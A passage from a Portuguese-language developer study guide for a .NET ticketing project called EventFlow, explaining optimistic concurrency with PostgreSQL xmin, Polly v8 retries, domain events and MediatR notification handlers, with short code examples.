GetByIdTrackedAsync() → sem AsNoTracking
```

---

---

## 21. Concorrência Otimista — xmin e DbUpdateConcurrencyException

### O que é?

Quando dois usuários tentam modificar o **mesmo dado ao mesmo tempo**, temos um problema de concorrência. Existem duas estratégias:

| Estratégia | Como funciona | Quando usar |
|---|---|---|
| **Pessimista** | Bloqueia o registro com `SELECT FOR UPDATE` — só um usuário acessa por vez | Alta chance de conflito, escritas críticas |
| **Otimista** | Não bloqueia — detecta conflito no `SaveChanges` e avisa | Baixa chance de conflito (a maioria dos sistemas) |

Para o EventFlow, a concorrência otimista é ideal: dois attendees reservando ao mesmo tempo é raro, e quando acontece, um dos dois precisa apenas entrar na fila.

### O que é `xmin`?

Todo registro no PostgreSQL tem uma coluna de sistema chamada `xmin`. Ela guarda o **ID da transação** que criou ou modificou aquela versão da linha. A cada UPDATE, o `xmin` muda automaticamente — sem precisar de coluna extra na tabela.

```sql
-- PostgreSQL
SELECT id, title, xmin FROM events WHERE id = '...';
-- xmin: 1234
```

### Como o EF Core usa o `xmin`?

Configurado via `UseXminAsConcurrencyToken()` na EventConfiguration:

```csharp
builder.UseXminAsConcurrencyToken();
```

Quando o EF Core vai fazer um `UPDATE`, ele adiciona o `xmin` original na cláusula `WHERE`:

```sql
UPDATE events
SET updated_at = '2024-...'
WHERE id = 'abc' AND xmin = 1234  -- ← verifica a versão
```

Se outro request já modificou o evento (xmin agora é 1235), o `WHERE` não encontra nenhuma linha → **0 rows affected** → EF Core lança `DbUpdateConcurrencyException`.

### No EventFlow — BookTicketHandler

O problema: dois requests chegam simultâneos para o último ingresso de um evento com `capacity=1`.

```
Request A: lê Event (xmin=42), AvailableSpots=1 → cria Ticket + Touch()
Request B: lê Event (xmin=42), AvailableSpots=1 → cria Ticket + Touch()

Request A: SaveChanges → UPDATE events WHERE xmin=42 → OK → xmin vira 43
Request B: SaveChanges → UPDATE events WHERE xmin=42 → 0 rows → DbUpdateConcurrencyException!
```

### Por que chamar `event.Touch()`?

Inserir um Ticket cria uma linha NOVA na tabela `tickets` — não altera a linha do `events`. Sem `Touch()`, o xmin do evento não seria verificado e o conflito não seria detectado.

`Touch()` força um `UPDATE` na linha do evento, ativando a verificação do `xmin`.

### Armadilha: "Race condition ainda existe em alguns ms"

Sim, existe uma janela mínima entre o `SELECT` e o `UPDATE`. A concorrência otimista elimina o problema para a **maioria dos casos** em sistemas de médio porte. Para sistemas com altíssima concorrência (tipo Ticketmaster), usa-se pessimista + filas distribuídas.

---

## 22. Polly — Resiliência e Retry

### O que é?

Polly é uma biblioteca .NET de **resiliência**. Ela permite configurar comportamentos automáticos para falhas temporárias:

- **Retry**: tentar novamente quando uma operação falha
- **Circuit Breaker**: parar de tentar após N falhas consecutivas
- **Timeout**: desistir se demorar mais que X segundos
- **Bulkhead**: limitar o paralelismo para proteger recursos

### Por que usar?

Sem Polly:
```csharp
try {
    await unitOfWork.SaveChangesAsync();
} catch (DbUpdateConcurrencyException) {
    // O que fazer? Tentar de novo? Quantas vezes? Com que delay?
    // → Código repetitivo, inconsistente entre diferentes handlers
}
```

Com Polly v8 (`ResiliencePipeline`):
```csharp
private static readonly ResiliencePipeline _retry = new ResiliencePipelineBuilder()
    .AddRetry(new RetryStrategyOptions
    {
        ShouldHandle = new PredicateBuilder().Handle<DbUpdateConcurrencyException>(),
        MaxRetryAttempts = 3,
        Delay = TimeSpan.Zero  // sem delay: recarregamos estado e decidimos imediatamente
    })
    .Build();

await _retry.ExecuteAsync(async ct => {
    // toda a lógica de reserva aqui
    // se DbUpdateConcurrencyException → Polly retenta automaticamente
});
```

### Polly v7 vs v8

O Polly v8 (lançado em 2023) mudou a API significativamente:

| v7 (antigo) | v8 (atual) |
|---|---|
| `Policy.Handle<X>().Retry(3)` | `new ResiliencePipelineBuilder().AddRetry(...)` |
| `Policy.ExecuteAsync(...)` | `pipeline.ExecuteAsync(...)` |
| `HttpClientFactory.AddTransientHttpErrorPolicy(...)` | `AddResilienceHandler(...)` |

No EventFlow usamos v8 diretamente (sem HttpClient), pois o retry é em lógica de banco.

### Quando usar retry vs não usar

| Situação | Retry? |
|---|---|
| `DbUpdateConcurrencyException` | ✅ Sim — conflito temporário, resolvível |
| `DbUpdateException` (violação de unique constraint) | ❌ Não — dado inválido, retry não ajuda |
| Timeout de banco de dados | ✅ Sim — com backoff exponencial |
| Erro de validação do usuário | ❌ Não — o dado é errado, não o sistema |

### No EventFlow

O retry do BookTicketHandler recarrega o evento no banco a cada tentativa. Se a vaga sumiu → vai para a fila. Se ainda há vaga → tenta salvar novamente. Após 3 tentativas, a exceção é propagada para o ExceptionMiddleware.

---

## 23. Domain Events na Prática

### O que é um Domain Event?

Um **Domain Event** representa algo que aconteceu no domínio e que outras partes do sistema podem querer saber. É diferente de uma exceção (erro) — é um fato ocorrido.

Exemplos:
- `TicketCancelled` — um ingresso foi cancelado
- `EventPublished` — um evento foi publicado
- `WaitlistEntryPromoted` — alguém da fila recebeu uma vaga

### Por que não chamar o serviço diretamente?

**Sem Domain Events (acoplado):**
```csharp
// CancelTicketHandler
ticket.Cancel();
await unitOfWork.SaveChangesAsync();
await waitlistService.PromoteNextAsync(ticket.EventId); // acoplamento direto
await emailService.SendCancellationEmailAsync(ticket);   // mais acoplamento
await analyticsService.RecordCancellationAsync(ticket);  // ainda mais
```

Problema: `CancelTicketHandler` precisa conhecer todos os efeitos colaterais. Cada nova "reação" exige modificar o handler original.

**Com Domain Events (desacoplado):**
```csharp
// CancelTicketHandler — só sabe cancelar
ticket.Cancel(); // acumula TicketCancelled internamente
await unitOfWork.SaveChangesAsync();
await publisher.Publish(new TicketCancelledNotification(...));
// handlers separados cuidam do restante automaticamente
```

### Acúmulo vs Dispatch imediato

No EventFlow, a entidade **acumula** os eventos em uma lista interna:
```csharp
// Ticket.cs
private readonly List<IDomainEvent> _domainEvents = [];

public void Cancel() {
    Status = TicketStatus.Cancelled;
    _domainEvents.Add(new TicketCancelled(Id, EventId, AttendeeId)); // acumula
}
```

O handler despacha **depois de salvar no banco**:
```csharp
ticket.Cancel();
await unitOfWork.SaveChangesAsync(); // ← persiste PRIMEIRO
foreach (var e in ticket.DomainEvents)
    await publisher.Publish(new TicketCancelledNotification(...)); // ← depois
ticket.ClearDomainEvents();
```

### Por que salvar antes de despachar?

Se despacharmos antes de salvar:
- A promoção da fila acontece, mas o cancelamento pode falhar → **inconsistência**

Se salvarmos antes de despachar:
- Na pior das hipóteses: cancelamento salvo, mas promoção não ocorreu → **corrigível**

**Produção real**: usar o **Outbox Pattern** — salvar o evento na mesma transação do cancelamento, despachar depois por um worker separado. Garante "pelo menos uma vez" (at-least-once delivery).

---

## 24. INotificationHandler — Comunicação Desacoplada

### O que é?

No MediatR, além de `IRequest/IRequestHandler` (com resposta), existe o par `INotification/INotificationHandler` (sem resposta, tipo "fire and forget").

```
IRequest<T>  → um handler responde           → como uma chamada de função
INotification → N handlers podem responder   → como um evento de broadcast
```

### Por que separar `TicketCancelled` (Domain) de `TicketCancelledNotification` (Application)?

```
Domain:      TicketCancelled : IDomainEvent       (sem referência ao MediatR)
Application: TicketCancelledNotification : INotification  (MediatR INotification)
```

O `Domain` não pode depender do MediatR (violaria Clean Architecture). A `Application` cria uma "ponte": lê os `IDomainEvent` acumulados e publica as `INotification` correspondentes.

### Como registrar múltiplos handlers

Uma `INotification` pode ter **quantos handlers quiser**:
```csharp
// Handler 1: promoção da fila de espera
class WaitlistPromotionHandler : INotificationHandler<TicketCancelledNotification> { ... }

// Handler 2 (futuro): envio de e-mail de confirmação
class SendCancellationEmailHandler : INotificationHandler<TicketCancelledNotification> { ... }

// Handler 3 (futuro): atualização de analytics
class AnalyticsHandler : INotificationHandler<TicketCancelledNotification> { ... }
```

MediatR chama **todos** automaticamente quando `publisher.Publish(...)` é chamado. Para adicionar um novo efeito colateral, basta criar um novo handler — sem modificar o `CancelTicketHandler`.

### Diferença: `ISender.Send()` vs `IPublisher.Publish()`

| | `ISender.Send()` | `IPublisher.Publish()` |
|---|---|---|
| Handlers | Exatamente 1 | 0 ou mais |
| Retorno | `TResponse` | `void / Task` |
| Uso | Commands e Queries | Domain Events / Notificações |
| Erro se 0 handlers | Sim | Não (silencioso) |

---

*Documento atualizado em: Fase 3 — Ingressos + Regras de Negócio*
